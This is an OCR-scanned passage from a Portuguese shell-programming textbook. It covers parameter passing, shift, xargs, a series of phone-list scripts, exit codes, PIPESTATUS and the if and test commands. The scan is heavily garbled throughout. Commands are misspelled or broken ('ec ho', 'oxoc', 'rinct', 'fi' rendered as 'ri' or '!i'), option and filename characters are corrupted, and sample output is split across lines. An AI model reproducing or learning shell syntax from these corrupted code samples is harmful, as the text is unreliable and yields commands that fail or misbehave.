ec ho O Programa $0 Re cebeu Sil Paramet:ros Listados i'J, aixo : 
ec ho s• 
$ param4 1. 2. 3. 4. 5 . 6. 7. 8. 9. 10. 11. 
O Programa param4 Recebeu 11 Paramet ros Listados !\.baixo : 
l. 2 . 3 . 4 . S . 6 . 7 . 9 . 9 . 1 o . 11. 
O tO' e o ft! parãmetros foram listados 
O comando s hitt n mata os n primeiros parâmetros, o valor default 
de n é 1. Esse é um dos comandos que nos permite passar mais que 
9 parâmetros. 
Exemplo: 
$ cat param5 
ModifiCando oprogramaparam3 ..• 
echo O Programa $0 Receb eu $8 Par/imetr os 
echo $1 
echo $2 
shift 10 
ec ho Sl 
$ pa.ram5 l. 2. 3. 4. 5. 6. 7. 8. 9. lO. 11. 
o Progr ano..a par amS Recebeu 11 Parâmetros 
1. 
2 . 
ll. 
Matei os 10 primeiros parâmetros e ... 
O tt• parAmelro se transfonna no 1• 
Agora sim ... 
Observe a diferença que faz o uso das aspas no mesmo exemplo: 
$ param5 "l. 2. 3. 4. S. 6. 7." 8 . 9. lO . 11 . 
O pro9 ra~A paramS Rêc êbeu S 
Pa ra~tros 
l. 2 . 3 . 4 . S. 6 . 7 . 
9 . 
1• parâmetro porque os sspss egrupom 
param5 [ 4 ] : shi ft : bad number 
Agora nAo existem lO parAmetros para o shin 
Apesar de podermos trabalhar com os parâmetros de ordem 
superior a nove das formas mostradas anteriormente, existem 
outras maneiras, até mais intuitivas de fazê-lo, que serão apre-
sentadas mais adiante. 
1\latcna com d r bS utor<t 
Viemos aquí para falar ou para programar? 
163 
Olha só este script para saber desde quando as pessoas se Jogaram 
(AJ\GH ! ! ! l • 
$ ca.t kadeo 
echo -n " $1 esta legado desde " 
who f grep $1 I cut - c l9-30 
$ kadeo e.nio 
enio esta logado desde sep 30 16: 49 
SI e o t• parâmetro. A opção - n e para niio saltar linha 
Na saída do wl1o p~quiso usuilrio e collo data 
Executando, $1 conterâ enio 
Alterando o listdlr, que está no início da seção Passando e Receben-
do Parâmetros para lis t dirl , de forma a listar o conteúdo de um diretório 
especificado, e não somente o diretório corrente como fazia o listdir, 
teríamos: 
$ cat lis t dirl 
cd $1 
cd para o diretório que seril passado 
echo Os Jl..rqui vos do Dir et orio $1 Sa.o: 
ls -l 
$ listdirl /tmp 
Na execução passando o diretório ltmp 
Os Arquivos do Diretorio /tmp Sao: 
tot a l 92 
- n•- r--r--
1 enio 
ssup 
3LO Sep 30 15 : 50 23009 
-r,.,. _______ 
1 root 
root 
10794 Sep 30 17: 29 799 . debug 
-n.;-r--r--
1 bolpetti ssup 
o Sep 30 os : 40 csa 
- C \'l- :z:;...~- r--
1 root 
sys 
592 Sep 29 20 : 07 sa . aàrfl 
- rw-rw- r'o'-
l root 
root 
20 Sep 30 14 :51 XX 
Esta parte de passagem de parâmetros é muito importante; até agora, 
o que vimos foi muito superficial. Mais à frente veremos outros exemplos e 
aplicações que farão uma abordagem mais detalhada do tema. 
O comando que passa parâmetros 
Vejamos um caso diferente de passagem de parâmetros: suponhamos que 
desejamos procurar, recursivamente, a partir do diretório corrente, todos os 
arquivos que possuam uma determinada <cadei a de caracter es>. Ora, isso 
é fácil- você dirá. Para listar recursivamente o conteúdo do diretório, eu devo 
usar o comando ls - R e o comando para listar os arquivos que possuem uma 
determinada <cadeias de caracteres> é o grep -1 . Então se eu fizer: 
$ l s - R 
f grep -1 <cadeia do caractoros> 
1\latcna com d r bS utor<t 
164 Programação SheU Linux 
Estarei fazendo uma grande besteira, pois estarei procurando <cadeia 
de caracceres> no nome dos arquivos e não como conteúdo deles. 
Como fazer então? Felizmente para nós "shelleiros" existe um comando, 
cuja função primordial é construir listas de parâmetros e passá-las para a 
execução de outros programas ou instruções. Este comando é o xa rgs e 
deve ser usado da seguinte maneira: 
xargs [comando (argumento inicial] ) 
Caso o comando, que pode ser inclusive um script She/1, seja omitido, 
será usado por default o echo. 
O xargs combina o argumento inicial com os argumentos recebidos 
da entrada padrão, de forma a executar o comando especificado uma ou 
ma1s vezes. 
Exemplo: 
Vamos melhorar a pesquisa proposta antes e torná-la mais genérica. Va-
mos otimizá-la trocando 1s - R pelo comando nnd com a opção - cype 
f para pesquisar somente os arquivos normais, desprezando diretórios, 
arquivos especiais, arquivos de ligações, etc .. já que o comando ls - R 
gera, além do nome dos arquivos, também o nome dos diretórios, e vamos 
torná-la mais genérica recebendo o nome do diretório inicial e a cadeia a 
ser pesquisada como parâmetros. Para isso fazemos: 
$ cat grepr 
~ 
I 
Gre(> recursivo 
j 
Pesquisa a cadei a de carac~eres def~da em $2 a partir do diretorio $1 
fL'ld $ 1 -~ype f - print(xargs grep -1 "$2 " 
Vamos executá-lo: 
$ gropr .. par~tro 
.. /t.ranspro 
.. /curso/t.estchar 
.. /curso/c4e2 
. . /curso/cSel 
.. /curso/c6el 
.. /cur,.o/c7"1 
.. /cur .so/c8e2 
.. /curso/medi eval 
.. /newtrftp/movc t . sh 
·/ype f sigtf,;a 8rQ'UNos nonnlis 
Este está no dlrelôrlo pai { .. ) 
Todos estes arquivos o programa 
locolizou no diretório curso. abaixo do pel 
Este foi encontrado no diretódo newttf!p 
1\latcna com d r bS utor <t 
Viemos aquí para falar ou para programar? 
165 
Na execução desse script procuramos, a partir do diretório pai 1 .. 1 , 
todos os arquivos que continham a cadeia parametro, e podemos no-
tar que o primeiro arquivo encontrado estava no diretório pai, o último no 
ne1~ trftp , e todos os demais no diretório curso , validando dessa forma a 
pesquisa recursiva. 
Exatamente a mesma coisa poderia ser feita se a linha do programa fosse 
a seguinte: 
find $1 - type f - exec grep -1 '' $2 '' {) \ : 
Vejasintaxedofindnap8fle/destetivro 
Esse processo tem duas grandes desvantagens sobre o anterior: 
1. A primeira é bastante visível: o tempo de execução desse método é 
muito superior ao daquele, isso porque o grep será feito em cada 
arquivo que lhe for passado pelo !ind, um a um, ao passo que com 
o xargs será passada toda ou, na pior das hipóteses. a maior parte 
possível, da lista de arquivos gerada pelo !ind; 
2. Dependendo da quantidade de arquivos encontrados que atendem 
ao !ínct, poderemos ganhar aquela famosa e fatídica mensagem de 
erro "Too many arguments" indicando um estouro da pilha de exe-
cução do grep . Como foi dito no item anterior, se usarmos o xargs 
ele passará para o grep a maior quantidade de parâmetros possível, 
suficiente para não causar esse erro, e, caso necessário, executará 
o grep mais de uma vez. 
ATEN ÃO 
Aê pessoal do Linux que usa o ls colorido que nem porta de 
tinturaria: nos exemplos a seguir que envolvem essa instrução, 
vocês devem usar a opção --color=none , senão os resultados 
não ocorrerão conforme o esperado. 
Vamos agora analisar um exemplo que é mais ou menos o inverso desse 
que acabamos de ver. Desta vez, vamos fazer um script para remover todos 
os arquivos do diretório corrente, pertencentes a um determinado usuário. 
A primeira ideia que surge é, como no caso anterior, usar um comando 
rinct, da seguinte maneira: 
~ find 
. - uso r c<>.ra - oxoc = - f () \; 
·User cara signincs todos srqs. cujo dono é cara 
1\latcna com d r bS utor<t 
166 Programação SheU Linux 
Quase estaria certo, o problema é que dessa forma você removeria não 
só os arquivos do cara no diretório corrente, mas também de todos os ou-
tros subdiretórios "pendurados" nele. Vejamos então como fazer: 
$ ls - l i qrep cara I cut -css- I xarqs r m 
Dessa forma, o grep selecionou os arquivos que continham a cadeia 
cara no diretório corrente listado pelo ls - 1 . O comando cut pegou so-
mente o nome dos arquivos. passando-os para a remoção pelo rm usando 
o comando xargs como ponte. 
O :-:args é também uma excelente ferramenta de criação de one-liners 
( scripts de somente uma linha). Veja este para listar todos os donos de arquivos 
(inclusive seus links) "pendurados· no diretório /bin e seus subdiretórios. 
$ f i nd / bi n - type f - f ollow I \ 
A contrabarra seTVe para o bash não ver o <ENTER> 
xargs l.s - al I tr - s • • I o.>t - f3 -d' • I sort -u 
Muitas vezes o /bin é um link (como no Solaris) e a opção -folloHs 
obriga o find a seguir o link. O comando xargs alimenta o ls - al e a 
sequência de comandos seguinte é para pegar somente o 3-º campo (dono) 
e classificâ-lo devolvendo somente uma vez cada dono (opção -u do co-
mando sort). 
Você pode usar as opções do xargs para construir comandos extrema-
mente poderosos. Para exemplificar isso e começar a entender as princi-
pais opções dessa instrução, vamos supor que temos de remover todos os 
arquivos com extensão . txt sob o diretório corrente e apresentar os seus 
nomes na tela. Veja o que podemos f.azer: 
$ f i nd . -typ<> f -nama "• .txt" I \ 
A contrabarra serve para o bash não ver o <ENTE R> 
xargs -i baah - c "echo removendo { I ; rm {I '' 
A opção - i do xargs troca pares de chaves 11 11 pela cadeia que está 
recebendo pelo pipe 1 1 1 • Então, neste caso, as chaves 1 1 1 1 serão troca-
das pelos nomes dos arquivos que satisfaçam ao comando nnct. 
Olha só a brincadeira que vamos fazer com o xargs: 
$ ls I xargs ooho > arq.ls 
$ ca.t arq.ls 
nrq.ls nrql nr q2 a.rq3 
1\latcna com d r bS utor<t 
$ cat arq. ls I xargs - nl 
arq . ls 
acql 
arq2 
arq3 
Viemos aquí para falar ou para programar? 
167 
Quando mandamos a saída do l s para o arquivo usando o :-:args, 
comprovamos o que foi dito anteriormente, isto é, o xargs manda tudo 
que é possível (o suficiente para não gerar um estouro de pilha) de uma 
só vez. Em seguida, usamos a opção - n 1 para listar um por vez. Só 
para comprovar veja o exemplo a seguir, quando listaremos dois em 
cada linha: 
$ cat arq.ls I xargs -n 2 
arq .ls arq l 
nrq2 arqJ 
Mas a linha acima poderia (e deveria) ser escrita sem o uso de pipe < 11, 
da seguinte forma: 
$ xargs -n 2 < arq.ls 
Outra opção legal do xargs é a - p , na qual o ;.:args pergunta se você 
realmente deseja executar o comando. Digamos que em um diretório você 
tenha arquivos com a extensão . bug e . ok, os . bug estão com problemas 
que após corrigidos são salvos como . o k . Dê uma olhadinha na listagem 
deste diretório: 
$ ls dir 
arql.bug 
arq l.ok 
arq2 .bug 
arq2 . o): 
arq9 . bug 
arq9 . o!o: 
Para comparar os arquivos bons com os defeituosos, fazemos: 
$ l s 
f xargs - p - n2 diff - c 
d i f f -c ar ql. bug .uql. ok ? ... y 
diff -c arq9 .bug arq9 .ok ? .•• y 
1\latcna com d r bS utor<t 
168 Programação Shell Linux 
Para finalizar, o xa rgs também tem a opção - t, onde vai mostrando 
as instruções que montou antes de executá-las. Gosto muito dessa opção 
para ajudar a depurar o comando que foi montado. 
Então podemos resumir o comando de acordo com a tabela a seguir: 
:d Opção Ação 
-i 
-nNum 
Substitui o par de chaves C{}) pelas cadeias recebidas 
Manda o máximo de parâmetros recebidos, até o máximo 
de Num para o comando a ser executado 
·I Num 
Manda o máximo de linhas recebidas, até o máximo de Num 
para o comando a ser executado 
·P 
Mostra a linha de comando montada e pergunta se deseja 
executá-la 
-t 
Mostra a linha de comando montada antes de executá-la 
• 
Desta vez vamos ... 
Você se lembra do arquivo de telefones dos exemplos anteriores? 
$ cat telefones 
Ciro Grippi 
(021)555·1234 
Ney Gerhar dt 
(024)513-1321 
E:nio cardo.so 
(023) 232-3423 
Cl audi a Marci a 
(02 1)555-2112 
Paula ouane 
(011) 449 - 0969 
Hey Ga.z:rafas 
(021) 988-3398 
Vamos colocá-lo em ordem para facilitar o seu uso a partir deste ponto: 
$ sort - o telefones telefones 
$ cat telefones 
Ci ro Grippi 
Claudia Ma.tcia 
E:nio Cardoso 
lley Garrafas 
Ney Ge rhar dt 
Paula Duar te 
(02 1)555- 1234 
(021) 555-2112 
(023) 232- 3423 
(021)988-3398 
(024) 543- 4321 
(0 11 ) •14 9-0989 
O ·O indica a saida do sott. O próprio telefones 
I.' • ri 
Viemos aquí para falar ou para programar? 
169 
Programa para procurar pessoas no arquivo 
de telefones 
Você, a essa altura, já sabe que deve usar o comando grep para achar 
uma determinada pessoa neste arquivo: 
$ grep Car t ol efones 
Enio Cardoso 
(023) 232-3423 
E também sabe que, para procurar por um nome composto, você deve 
colocá-lo entre aspas: 
$ grep "Ney Ge" telefones 
Ney Gerhar dc 
(024)54 3- 4321 
Vamos então listar o script, que chamaremos de pp, para procurar uma 
pessoa que será passada como parâmetro e listar o seu registro. 
$ cat pp 
# 
Pesquisa Pessoa no Catalogo Telefonico 
IJ 
grep $1 telefones 
Vamos usá-lo: 
$ pp Ciro 
Ciro Grippi 
(021 ) 555-1234 
$ pp "Ney Ge" 
grep : can ' t open Ge 
telefones :Ney Gerhardc 
(021)543-'!321 
telefones :Ney Garrafas 
(021)988-3398 
Entre aspas como manda o figurino 
Quequeisso minha gente??? 
No último exemplo, cuidadosamente, coloquei Ney Ge entre aspas. O 
que houve? Onde foi que errei? Olhe novamente para o grep executado 
pelo programa pp: 
grep $1 telefones 
Mesmo colocando Ney Ge entre aspas, para que seja encarado como 
um único parâmetro, quando o st foi passado pelo She// para o comando 
grep, transformou-se em dois argumentos. Dessa forma, o conteúdo final 
da linha que o grep executou foi o seguinte: 
grep Ney Ge telefones 
1\latcna com d r bS utor<t 
170 Programação SheU Linux 
Como a sintaxe do grep é: 
grep <cadeia de carac&eres> {arql, arq2 , arq3, . .. arqn J 
O Shell entendeu que deveria procurar a cadeia de caracteres Ney nos 
arquivos Ge e telefones e, por não existir o arquivo Ge, gerou o erro. 
Para resolver esse problema, basta colocar a variável s1 entre aspas, 
da seguinte forma: 
$ ca t pp 
11 
j 
PesquLsa Pessoa no Cat alogo Tolefonico - versao 2 
' 
gr ep "' $1'' telefones 
$ pp Cir o 
Ciro Grippi 
(021)555-1234 
S pp "Ney Ge" 
Ney Gerhardc 
(024 ) 543-4321 
Continua funcionando ... 
Agora é que são elas ... 
VIU só? Não disse? 
O erro gerado por falta de aspas envolvendo variáveis é mui-
to frequente e de difícil diagnóstico para o iniciante em She/1 
script. Por isso aconselho que, sempre que possível (99% dos 
casos), coloque as variáveis entre aspas. 
Programa para inserir pessoas no arquivo de telefones 
Vamos continuar o desenvolvimento da série de programas para manipular 
o arquivo de telefones. Você, provavelmente, desejará adicionar pessoas a 
esse arquivo. Para tal vamos ver um programa chamado add que recebe 
dois argumentos- o nome da pessoa que será adicionada e o seu telefone: 
$ cat add 
@ 
3 Adiciona i'essoas ao Arquivo de Telefones 
i! 
echo " $1 
$2 " >> telefones 
Observe que entre o Sl e o S2 do exemplo anterior existe um caractere 
<TAB> que deve ser colocado entre aspas, para evitar que o She/1 o trans-
forme em um espaço simples. 
Copyr ht 
Viemos aqui para falar ou para programar? 
171 
Vamos executar este programa: 
$ add "Joao Bolpetti" (011)224-3469 
bash : s yncax e r r or : ' ( • unexpecced 
Ops/1 
Não se esqueça! Os parênteses por si só têm significado para o She/1, 
devendo, portanto, sempre ser protegidos da sua interpretação. Vamos ten-
tar de outra forma: 
$ add " Joao Bolpetti" " (011)224-3469" 
$ pp Bolp 
Joao Bolpetti 
(0 11)224-3469 
$ cat telefones 
Ci ro Gri ppi 
(02 1 ) 555- 1234 
Cl audi a 11arci a 
(021 )555 - 2112 
Enio Car doso 
(023 ) 232-3423 
Ney Gat.t:afas 
(02 1 ) 988 - 3398 
Ney Gerhar dt 
(024 )5 43-432 1 
Paul a Duarte 
(0 11 ) 4 49- 0989 
Joao Bo l pett i 
(Oll ) 224-3469 
Com os parênteses protegidos por aspas ... 
Só para ver se achamos a nova entrada 
Vamos ver o que houve 
Quase!!! O programa só não está 1 00% porque o arquivo tel e f ones 
não estaria mais classificado, já que todos os registros incluídos senam 
anexados ao final do arquivo. Vamos aprimorar este programa: 
$ cat add 
# 
# Aàiciona Pessoa s ao Arquivo de Tel ef ones -
Ve rsao 2 
# 
echo " $1 
$2 " >> telefones 
sort - o tel e f ones telef ones 
Classifica o arquivo. Saída nele mesmo 
Vamos ver sua execução: 
$ add "Luiz Carl os" "(021)767- 2124" 
$ cat tel e fones 
Ci ro Gr i ppi 
Cl audi a Marc i a 
Eni o Cardoso 
Joao Bo l petti 
Luiz Carlos 
Ney Garrafas 
Ne y Ger.ha r dt 
Pa u l a Dua r t e 
(021) 5 5 5 -12 34 
(02 1 ) 555- 2112 
(023 ) 232 - 3423 
(0 11 ) 224 - 3469 
(021) 767- 2 124 
(02 1 )988-3398 
(02 4) 543-4321 
(0 11 ) 4 49-0989 
Material com direitos autorais 
172 Programação SheU Linux 
Então, cada vez que incluímos um registro, o arquivo tele fo nes é 
classificado. 
Programa para remover pessoas do arquivo 
de telefones 
Não existe sistema que permita consultar um arquivo, incluir dados e não 
possibilite a remoção de registros. Portanto, dando prosseguimento a essa 
série de scripts, desenvolveremos um programa chamado rem que terá 
como argumento o nome da pessoa a ser removida. Isso deverá ser feito 
usando-se a opção -v do comando grep . (Veja na seção A Família de 
Comandos grep, Capítulo 2). 
$ cat rom 
j 
f Remove Pessoas do Arquivo de Tel efones 
i 
grep - v " $1'' telefone:s > / tmp/$$ 
mv /tmp/$$ tc:lcfone:s 
Nesse programa, o grep lista para /tmp/$S 1 o conteúdo de teleEones, 
exceto os registros que tenham a cadeia de caracteres especificada em 
s1. Depois da execução do comando grep, o velho telefones será subs-
tituído pelo novo 1 t mp/ s s. 
Vejamos sua execução: 
$ rem "J oao Bolpetti" 
$ cat telefones 
Ci ro Grippi 
Cl audi a Marcia 
Enio Cardoso 
Luiz Carlos 
Ney Garrafas 
Ney Gerhardt 
Paula Dua r~e 
$ rem "Ney• 
$ ca.t t .olofonos 
(021 1 555-1234 
(021 I 555- 2112 
(0231 232-3423 
(0211 767-212 4 
(02 ! 1 988-3398 
(024 I 543-4321 
(O ll l <149-0989 
Ci ro Grlppi 
(0211555-1234 
10. O diretôrioltmp é liberado para qualquer usuário poder ler e gravar e o$$ representa o PIO. Veja 
também nota de rodapé 1, Capitulo 1. 
1\latcna com d r bS utor<t 
Cl audia Marcia 
Enio Cardoso 
Luiz Carlos 
Paul a Duarte 
(02 1 ) 5 55-21 12 
(023 ) 232 - 3423 
(02 1 ) 767-2 124 
(0 11 ) 4 49 - 0989 
Viemos aqui para falar ou para programar? 
173 
No primeiro caso, João Bolpetti foi removido a contento. No segundo, no 
entanto, as entradas Ney Garrafas e Ney Gerhardt foram removidas, já que 
ambas satisfazem ao padrão de remoção informado. Vamos usar o progra-
ma adct para cadastrá-los de volta no t e l efones . 
$ add "Ney Gerhardt" " (024)543-4321 " 
$ add "Ney Ga rrafas" " (021 )988- 3398" 
Então vimos, conforme já havia antecipado, que para fazermos progra-
mas em She/1, basta "empilharmos" comandos em um arquivo, torná-lo 
executável e fim de papo. Vamos, a partir de agora, aprender instruções 
mais complexas que nos ajudarão na programação de verdade. 
Exercícios 
1. Fazer um programa para procurar, pelo sobrenome, pessoas no ar-
quivo telefones. 
2. Fazer um programa para listar todas as pessoas de um determinado 
DDD. 
3. Como posso pegar o último parâmetro passado, em uma lista de ta-
manho indeterminado? 
4. Listar os usuários que estão "legados" há mais de um dia. 
Verifique como funcionam os comandos date e who (ou 
finge r). 
Material com direitos autorais 
jCapítulo 4 
~ Liberdade condicional!! 
. 
i A partir de agora, você terá liberdade para executar co-
mandos condicionais, sem os quais nenhuma linguagem 
de programação pode sobreviver. Eles possibilitam testar 
situações corriqueiras dentro dos programas, de forma a 
permitir tomadas de decisões e contradecisões cabíveis 
em cada caso, mudando o fluxo de execução das rotinas. 
Todas as linguagens de programação se utilizam farta-
mente dos comandos condicionais. Por que o She/1 seria 
diferente? Ele também usa esses comandos, porém de 
uma forma não muito ortodoxa. Enquanto as outras lin-
guagens testam direto uma condição, o Shell testa o códi-
go de retomo do comando que o segue. 
O código de retorno de uma instrução está associado 
à variável $?, de forma que sempre que um comando é 
executado com sucesso, $? é igual a zero, caso contrá-
rio o valor retornado será diferente de zero. 
Exemplos: 
$ 1s - 1 quoquoisso 
Este nós conhecemos de outros carnavais ... 
-rw-r-- r--
1 JUlio dipao 
~16 Sep 
3 10: 53 quequeisso 
$ echo $? 
Que tal a execuç~o da instruçilo anterior?? 
o 
Beleza .. 
$ ls -1 nadadisso 
Deste eu nunca ouvi falar. .. 
nadadlSso: No such file or di::ectory 
$ echo $? 
Que tal a execução da instruçilo antetior?? 
2 
Zebta .. 
174 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
175 
Nos exemplos anteriores, pudemos ver que, no primeiro caso, quando 
verificamos a existência de queq ue isso, o código de retorno 1$? J foi zero, 
indicando que o comando ls foi bem sucedido. O oposto acontece no caso 
do na dadisso . 
Quando você executa diversos comandos encadeados em um pipe 1 1 J, 
o return code dado por echo 
$? reflete apenas o resultado de saida do 
último comando executado no pipe. O array PIPESTA'l' Us, por sua vez, ar-
mazena em cada elemento o resultado respectivo de cada um dos coman-
dos do pipe. $ { PI PESTAT us r o 1 J tem o return code do primeiro comando, 
s f PIPE:STATus [ 1 1 1 contém o return code do segundo, e assim por diante. 
O exemplo abaixo mostra um script que executa um pipe de três coman-
dos e imprime o retum code de cada um dos comandos: 
$ date I grep Wed I wc - 1 
$ echo $ {PIPESTATUS[ *]) 
o 1 o 
Na última linha temos a impressão do array s 1 PI PE:sTATus 1 : 
o (zero) 
indicando o sucesso do primeiro comando, 1 indicando que o grep falhou 
ao procurar pela cadeia vrect, e novamente o (zero) para o sucesso do 
comando wc - 1 . 
Você pode usar individualmente o conteúdo de s f PIPESTJl.Tus [ 01 J, 
s {PI PEST.P.TUSf l l 1 e 
s{PIPESTATu sr n l l . Entretanto, a utilização do array 
deve ser imediatamente posterior ao pipe, caso contrário o array será reu-
tilizado. Por exemplo, experimente colocar um 
$ echo $? 
entre o pipe e o comando echo $r PIPESTATus [ * J ) . 
O bom e velho if 
Qual é o programador que não conhece o comando i f? Como todas as ou-
tras linguagens, o She/1 também tem o seu comando if que, na sua forma 
geral, tem a seguinte sintaxe: 
if 
<comando> 
then 
<comando1> 
Se <comando> for bem sucedido (S? = 0) ... 
Então ... 
Execute 
Material com direitos autorais 
176 Programação SheU Linux 
<comando,> 
Estes 
< ... > 
Comandos ... 
el se 
Senão (S? ~ 0) ... 
<comando,> 
Execute 
<comando ? 
Os outros 
< . . . > 
Comandos .... 
fi 
Fim do teste condicional. 
Note que, diferentemente das outras linguagens, o comando i E do Shell, 
no seu formato geral, não testa uma condição, mas sim se uma instrução 
foi executada com sucesso ou não, isto é, se o código de retorno da ins-
trução foi igual a zero ou não. Mais à frente veremos que o if. além de 
testar o sucesso ou não da execução de outros comandos, também pode 
ser usado para testar condições (existe um comando expecífico para isso e 
o i f testa a execução dessa instrução). 
Por causa desta ambiguidade de funções, podemos afirmar que o coma-
do H do ambiente She/1 é mais poderoso que o seu equivalente em outras 
linguagens. 
Exemplo: 
Vamos escrever um script que nos diga se uma determinada pessoa, 
cujo nome será passado por parâmetro, fez fogin no seu computador: 
$ cat talogado 
11 
i 
Ve.cifica se de termi nado usuario esta ''logado11 
; 
if who I grep $1 
then 
echo $1 est4 logado 
else 
echo $1 nao es~a l ogado 
ri 
No trecho de programa anterior, o if executa o who 1 g r ep e testa o 
código de retorno do grep. Se for zero (o grep achou o usuário), o bloco 
de comandos "pendurado" abaixo do then será executado. Caso contrário, 
estes comandos serão saltados e, existindo um else, sua sequência de 
instruções será então executada. 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
177 
Observe o ambiente e a execução do tal ogado : 
$ who 
ci ro 
ttyp2 
Sep 
8 09 :02 
n ey 
ttyp4 
Sep 
8 1.4 : 51 
enio 
ttyp5 
Sep 
8 1 6 : 23 
hudson ttyp€ 
Sep 
8 10 : 33 
$ talogado enio 
enio 
ttyp5 
Sep 
8 1 6 : 23 
enio esta logado 
$ ta1ogado ZeNinguem 
ZeNinguem nao esta legado 
( 11 . o. 132 . 95) 
(11 . 0 . 132 . 96) 
(11. o . 132 . 9 3 ) 
( 11 . o. 132 . 91) 
( 11 . I) . 132 . 93) 
Quem está 'logado' ? 
Esta linha indesejável é a saída do who ... 
Esta sim é a resposta que esperávamos 
Observe ainda os testes a seguir, que foram feitos no mesmo ambiente 
dos exemplos anteriores: 
$ who I grep ciro 
ciro 
t t yp2 
Sep 
8 09 : 02 (11.0 . 132.95 ) 
$ echo $ ? 
o 
Comando grep executado com êxito 
$ who I g r ep ZeNi nguem 
$ echo $ ? 
1 
Exemplo 
Comando grep falhou ... 
Repare que a execução do talogado enio gerou uma linha 
correspondente à saída do ,.,ho , que não traz proveito algum 
para o programa; diria até que o ideal seria que ela não apa-
recesse. Para tal, existe um buraco negro do UNIX no qual 
todas as coisas colocadas desaparecem sem deixar vestígio. 
Este buraco negro, chamado /dev/null, é um arquivo especial 
do sistema, do tipo device, no qual todos estão aptos a gravar 
ou ler (neste último caso, ganhando imediatamente um EO E'). 
Vamos redirecionar para o buraco negro a saída do g rep , de forma a 
conseguir o resultado esperado no exercício anterior: 
$ cat tal ogado 
u 
# 
Ve.rifica se determi n ado u suaxio esta " loga.do'' -
vexsao 2 
# 
if Hho I grep $1 > /dev/nu11 
t hen 
Incluí ldev/null redirecionando a salda do who 
Material com direitos autorais 
178 Programação SheU Linux 
echo $1 esta 1ogado 
else 
echo $1 nao esta logado 
!i 
$ talogado enio 
enio esta logado 
Não op/JifJCeu a Unho indesejada 
Homessa11!! Alcançamos o desejado. Esse tal de Shell é fogo ... 
Para saber se o conteúdo de uma variável é numérico ou não, podería-
mos fazer: 
if expr st + L > /dev/null 2> /dev/null 
then 
Resunado de expr e erro que fr4o paraldevfnu/1 
echo Eh um n ume ro 
el sé 
echo Nao eh um nume ro 
!i 
Nesse exemplo, somando qualquer valor numenco (no caso 1) ao 
conteúdo de uma variável, se ela não for numérica, a instrução expr 
gerará um código de retorno diferente de zero que será capturado pelo 
comando H . 
Se o resultado de qualquer operação feita pelo expr resul-
tar em zero, seu código de retorno será diferente de zero. 
Então, no exemplo anterior, caso o conteúdo da variável 
fosse -1 , o resultado do H seria inválido. Experimente fa-
zer expr - 1 + 1 ou expr o + o e em seguida teste o código 
de retorno. 
Testando o test 
A essa altura dos acontecimentos você irá me perguntar: 
Ora, se o comando ~f só testa o conteúdo da variável $? , o que 
fazer para testar condições? 
11. Para quem não sabe, homessa é uma interjeição de espanto formada por /Jomem + essa. Shell 
também é cultura ... ;-) 
1\latcna com d r bS utor<t 
Liberdade condicional!! 
179 
Para isso o Shelf tem o comando test, que na sua forma geral obedece à 
seguinte sintaxe: 
t ese <express ão> 
Sendo <expres são> a condição que se deseja testar. O comando t es t 
avalia <expressão> e, se o resultado for verdadeiro, gera o código de re-
torno < $ ? l igual a zero; caso contrário, será gerado um código de retorno 
diferente de zero. 
Esse negócio de código de retomo para lá, $? para cá, está mechei-
rando a i t . . . 
Bom farol Realmente é normal a saída do comando t est ser usada 
como entrada do comando if, como veremos adiante. 
Exemplo 
Temos uma rotina que recebe um parâmetro e analisa se é S para Sim 
ou N para Não. A seguir, fragmento de sua codificação: 
$ cat p edi 
# 
íl 
Test a a resposta a um p edi d o . Deve s er (S)irn ou (N) ao 
# 
r e s p=$ 1 
i f 
t es t $resp = N 
t hen 
else 
fi 
e c ho El a na o d e i x a . . . 
if test $resp = S 
t hen 
e c ho Oba 1 
e l a de i xou! ! ! 
e l se 
echo Acho que ela est a ll<l duvida . 
fi 
$ pedi S 
Oba , ela deixou ! ! ! 
$ pedi N 
El a na o dei xa ... 
$ p edi A 
Acho que e l a esta na duvida . 
$pedi 
saída do tesf é entrada do íf 
Um if dentro do outro dificuffa a legibilidade 
Xiii, esqueci de passar o parâmetro ... 
Material com direitos autorais 
180 Programação SheU Linux 
ped1[6]: tese : argument expected 
pedi[lO) : test : argument expected 
Acho que ela esta na duvida . 
Ué, o que houve? 
Idem. •. 
Para entendermos os erros que ocorreram na última execução do p ed1 , 
repare que nas linhas 6 e 10 testamos o conteúdo da variável Sresp. Ora, 
como o script foi executado sem passagem de parâmetros. essa variável 
ficou sem valor definido. Assim, após a substituição do valor de sresp, o 
She/1 "viu" as seguintes linhas: 
pedi (6] 
•> i f 
t est • N 
pedi(lO) ;> I f 
test ; s 
Ora, como o She/1 está comparandlo um valor inexistente com s ou com 
N, dá aqueles erros. Se tivéssemos colocado $resp entre aspas da seguin-
te forma: 
if cest ''Sresp'' • N 
após a substituição da variável, a comparação seria de um valor nulo (que 
é diferente de um valor inexistente) com um literal (s ou N, dependendo da 
linha) e não apresentaria erro na sua execução. 
Vamos fazer os mesmos testes direto no prompt do UNIX: 
$ resp~N 
Sem brancos antes e depois do igual. Isto é atribuição. 
Brancos antes e após o Igual porque é teste. 
$ t e s t $ r esp • N 
$ echo $ ? 
o 
Se fizéssemos um if. o then seria executado. 
$ test $resp = S 
$ echo $? 
1 
Se fizéssemos um if. o e/se seria executado. 
Quanto ao uso do comando if , devemos realçar duas situações: 
Sempre que possível deve-se evitar um 1f dentro de outro, de forma 
a não dificultar a legibilidade e a lógica do programa. O UNIX permite 
isso com o uso de e li f substituindo o else . .. if . . . , além de otimi-
zar a execução. 
1\latcna com d r bS utor <t 
Liberdade condicional!! 
181 
Quando estivermos testando uma variável, seu nome deve, sempre 
que possível, estar entre aspas (isso já havia sido citado em uma 
"dica" do capítulo anterior) para evitar erros no caso dessa variável 
estar vazia, como aconteceu no script ped i. anterior, ou se seu conteú-
do tiver algo que deva ser protegido da interpretação do She/1. 
A rotina anterior poderia (e deveria) ser escrita da seguinte forma: 
$ cat pedi 
# 
# 
Testa a r espos t a a L11!1 pedid o . Deve s er (S}im o u (N) ao - Versao 2 
# 
resp=$1 
if 
t est ''$resp'' = N 
t hen 
echc Ela nao deixa . . . 
el if t est ''$resp" = S 
t hen 
echo Oba . ela d • 
I I I 
e~ xou ... 
el se 
echo Acho que ela est a 
fi 
$ pedi 
na 
Acho que el a est a na duvida . 
d uvida . 
Repare que a variável foi colocada entre aspas. 
Repare uso do elif e a variável entre aspas. 
Executando sem informar parâmetro. 
Não indicou erro de execução. 
Mas, para o programa ficar supimpa, que tal fazê-lo da forma a seguir: 
$ cat pedi 
# 
# 
Testa a r esposta a um pedi do . Deve ser (S)im ou (N) ao - Versao 3 
u 
rr 
